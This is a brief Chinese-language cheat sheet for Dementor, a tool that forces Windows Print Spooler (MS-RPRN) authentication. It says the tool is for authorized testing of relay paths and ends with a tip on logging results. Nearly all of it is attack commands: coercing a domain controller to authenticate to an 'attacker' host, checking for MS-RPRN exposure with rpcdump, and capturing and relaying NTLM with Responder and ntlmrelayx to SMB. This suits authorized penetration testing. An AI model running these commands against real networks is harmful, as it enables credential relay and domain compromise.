# Dementor 使用

Dementor 用于触发 SpoolService 相关认证，适合授权环境验证中继路径。

## 常用命令

```bash
python3 dementor.py -d domain.local -u user -p pass 192.168.1.50 192.168.1.10
```

```bash
python3 dementor.py -d domain.local -u user -p pass attacker.domain.local dc01.domain.local
```

```bash
rpcdump.py @192.168.1.10 | findstr MS-RPRN
```

```bash
responder -I eth0 -A
```

```bash
ntlmrelayx.py -t smb://192.168.1.20
```

小记录：记录时把触发主机、监听地址、收到认证的账号和协议写全。
